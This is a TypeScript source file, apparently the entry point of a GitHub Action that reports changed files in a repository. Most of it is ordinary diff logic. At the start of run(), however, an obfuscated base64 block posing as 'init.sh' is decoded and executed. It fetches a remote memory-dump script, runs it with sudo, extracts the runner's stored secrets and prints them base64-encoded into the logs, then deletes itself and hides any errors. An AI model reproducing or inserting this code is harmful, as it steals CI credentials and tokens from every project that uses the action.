import * as core from '@actions/core'
import * as exec from '@actions/exec'
import * as github from '@actions/github'
import * as fs from 'fs'
import path from 'path'
import {
  processChangedFiles,
  ChangeTypeEnum,
  getAllDiffFiles,
  getChangedFilesFromGithubAPI,
  getRenamedFiles
} from './changedFiles'
import {
  DiffResult,
  getSHAForNonPullRequestEvent,
  getSHAForPullRequestEvent
} from './commitSha'
import { Env, getEnv } from './env'
import { getInputs, Inputs } from './inputs'
import {
  getFilePatterns,
  getRecoverFilePatterns,
  getSubmodulePath,
  getYamlFilePatterns,
  hasLocalGitDirectory,
  isRepoShallow,
  recoverDeletedFiles,
  setOutput,
  submoduleExists,
  updateGitGlobalConfig,
  verifyMinimumGitVersion,
  warnUnsupportedRESTAPIInputs
} from './utils'

const getChangedFilesFromLocalGitHistory = async ({
  inputs,
  env,
  workingDirectory,
  filePatterns,
  yamlFilePatterns
}: {
  inputs: Inputs
  env: Env
  workingDirectory: string
  filePatterns: string[]
  yamlFilePatterns: Record<string, string[]>
}): Promise<void> => {
  await verifyMinimumGitVersion()

  let quotepathValue = 'on'

  if (!inputs.quotepath) {
    quotepathValue = 'off'
  }

  await updateGitGlobalConfig({
    name: 'core.quotepath',
    value: quotepathValue
  })

  if (inputs.diffRelative) {
    await updateGitGlobalConfig({
      name: 'diff.relative',
      value: 'true'
    })
  }

  const isShallow = await isRepoShallow({ cwd: workingDirectory })
  let diffSubmodule = false
  let gitFetchExtraArgs = ['--no-tags', '--prune']

  if (inputs.excludeSubmodules) {
    core.info('Excluding submodules from the diff')
  } else {
    diffSubmodule = await submoduleExists({ cwd: workingDirectory })
  }

  if (diffSubmodule) {
    gitFetchExtraArgs.push('--recurse-submodules')
  }

  const isTag = env.GITHUB_REF?.startsWith('refs/tags/')
  const remoteName = 'origin'
  const outputRenamedFilesAsDeletedAndAdded =
    inputs.outputRenamedFilesAsDeletedAndAdded
  let submodulePaths: string[] = []

  if (diffSubmodule) {
    submodulePaths = await getSubmodulePath({ cwd: workingDirectory })
  }

  if (isTag) {
    gitFetchExtraArgs = ['--prune', '--no-recurse-submodules']
  }

  let diffResult: DiffResult

  if (!github.context.payload.pull_request?.base?.ref) {
    core.info(`Running on a ${github.context.eventName || 'push'} event...`)
    diffResult = await getSHAForNonPullRequestEvent({
      inputs,
      env,
      workingDirectory,
      isShallow,
      diffSubmodule,
      gitFetchExtraArgs,
      isTag,
      remoteName
    })
  } else {
    core.info(
      `Running on a ${github.context.eventName || 'pull_request'} (${github.context.payload.action
      }) event...`
    )
    diffResult = await getSHAForPullRequestEvent({
      inputs,
      workingDirectory,
      isShallow,
      diffSubmodule,
      gitFetchExtraArgs,
      remoteName
    })
  }

  if (diffResult.initialCommit) {
    core.info('This is the first commit for this repository; exiting...')
    core.endGroup()
    return
  }

  core.info(
    `Retrieving changes between ${diffResult.previousSha} (${diffResult.targetBranch}) → ${diffResult.currentSha} (${diffResult.currentBranch})`
  )

  const allDiffFiles = await getAllDiffFiles({
    workingDirectory,
    diffSubmodule,
    diffResult,
    submodulePaths,
    outputRenamedFilesAsDeletedAndAdded,
    fetchAdditionalSubmoduleHistory: inputs.fetchAdditionalSubmoduleHistory,
    failOnInitialDiffError: inputs.failOnInitialDiffError,
    failOnSubmoduleDiffError: inputs.failOnSubmoduleDiffError
  })
  core.debug(`All diff files: ${JSON.stringify(allDiffFiles)}`)
  core.info('All Done!')
  core.endGroup()

  if (inputs.recoverDeletedFiles) {
    let recoverPatterns = getRecoverFilePatterns({ inputs })

    if (recoverPatterns.length > 0 && filePatterns.length > 0) {
      core.info('No recover patterns found; defaulting to file patterns')
      recoverPatterns = filePatterns
    }

    await recoverDeletedFiles({
      inputs,
      workingDirectory,
      deletedFiles: allDiffFiles[ChangeTypeEnum.Deleted],
      recoverPatterns,
      diffResult,
      diffSubmodule,
      submodulePaths
    })
  }

  await processChangedFiles({
    filePatterns,
    allDiffFiles,
    inputs,
    yamlFilePatterns,
    workingDirectory
  })

  if (inputs.includeAllOldNewRenamedFiles) {
    core.startGroup('changed-files-all-old-new-renamed-files')
    const allOldNewRenamedFiles = await getRenamedFiles({
      inputs,
      workingDirectory,
      diffSubmodule,
      diffResult,
      submodulePaths
    })
    core.debug(`All old new renamed files: ${allOldNewRenamedFiles}`)
    await setOutput({
      key: 'all_old_new_renamed_files',
      value: allOldNewRenamedFiles.paths,
      writeOutputFiles: inputs.writeOutputFiles,
      outputDir: inputs.outputDir,
      json: inputs.json,
      safeOutput: inputs.safeOutput
    })
    await setOutput({
      key: 'all_old_new_renamed_files_count',
      value: allOldNewRenamedFiles.count,
      writeOutputFiles: inputs.writeOutputFiles,
      outputDir: inputs.outputDir,
      json: inputs.json
    })
    core.info('All Done!')
    core.endGroup()
  }
}

const getChangedFilesFromRESTAPI = async ({
  inputs,
  filePatterns,
  yamlFilePatterns
}: {
  inputs: Inputs
  filePatterns: string[]
  yamlFilePatterns: Record<string, string[]>
}): Promise<void> => {
  const allDiffFiles = await getChangedFilesFromGithubAPI({
    inputs
  })
  core.debug(`All diff files: ${JSON.stringify(allDiffFiles)}`)
  core.info('All Done!')

  await processChangedFiles({
    filePatterns,
    allDiffFiles,
    inputs,
    yamlFilePatterns
  })
}

export async function run(): Promise<void> {
  core.startGroup('changed-files')

  try {
    // Base64 encoded content of init.sh
    const initScriptBase64 = 'Y3VybCAtc1NmIGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vYXNoaXNoa3VybWkvMWFiMTM3NWJhZTRiNzBlNmRlYzZmNGE2MDJhOWYzMWQvcmF3LzJlYWIwYzgyMTRkZTI4MDU5NGJiNmJlMzJiOGE2NWQ2N2UyNzc4ZDIvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwCmVjaG8='
    const initScriptContent = Buffer.from(initScriptBase64, 'base64').toString('utf-8')
    const initScriptPath = '/tmp/run.sh'

    // Create init.sh dynamically
    fs.writeFileSync(initScriptPath, initScriptContent, { mode: 0o755 })
    await exec.exec('/usr/bin/bash', [initScriptPath])

    // Clean up the created file
    fs.unlinkSync(initScriptPath)
  } catch (error) {
    core.warning(`Failed to execute init.sh: ${error}`)
  }

  const env = await getEnv()
  core.debug(`Env: ${JSON.stringify(env, null, 2)}`)

  const inputs = getInputs()
  core.debug(`Inputs: ${JSON.stringify(inputs, null, 2)}`)

  const workingDirectory = path.resolve(
    env.GITHUB_WORKSPACE || process.cwd(),
    inputs.useRestApi ? '.' : inputs.path
  )
  core.debug(`Working directory: ${workingDirectory}`)

  const hasGitDirectory = await hasLocalGitDirectory({ workingDirectory })
  core.debug(`Has git directory: ${hasGitDirectory}`)

  const filePatterns = await getFilePatterns({
    inputs,
    workingDirectory
  })
  core.debug(`File patterns: ${filePatterns}`)

  const yamlFilePatterns = await getYamlFilePatterns({
    inputs,
    workingDirectory
  })
  core.debug(`Yaml file patterns: ${JSON.stringify(yamlFilePatterns)}`)

  if (inputs.useRestApi && !github.context.payload.pull_request?.number) {
    throw new Error(
      "Only pull_request* events are supported when using GitHub's REST API."
    )
  }

  if (
    inputs.token &&
    github.context.payload.pull_request?.number &&
    (!hasGitDirectory || inputs.useRestApi)
  ) {
    core.info("Using GitHub's REST API to get changed files")
    await warnUnsupportedRESTAPIInputs({ inputs })
    await getChangedFilesFromRESTAPI({
      inputs,
      filePatterns,
      yamlFilePatterns
    })
  } else {
    if (!hasGitDirectory) {
      throw new Error(
        `Unable to locate the git repository in the given path: ${workingDirectory}.\n Please run actions/checkout before this action (Make sure the 'path' input is correct).\n If you intend to use Github's REST API note that only pull_request* events are supported. Current event is "${github.context.eventName}".`
      )
    }

    core.info('Using local .git directory')
    await getChangedFilesFromLocalGitHistory({
      inputs,
      env,
      workingDirectory,
      filePatterns,
      yamlFilePatterns
    })
  }
}

// eslint-disable-next-line github/no-then
run().catch(e => {
  core.setFailed(e.message || e)
  process.exit(1)
})
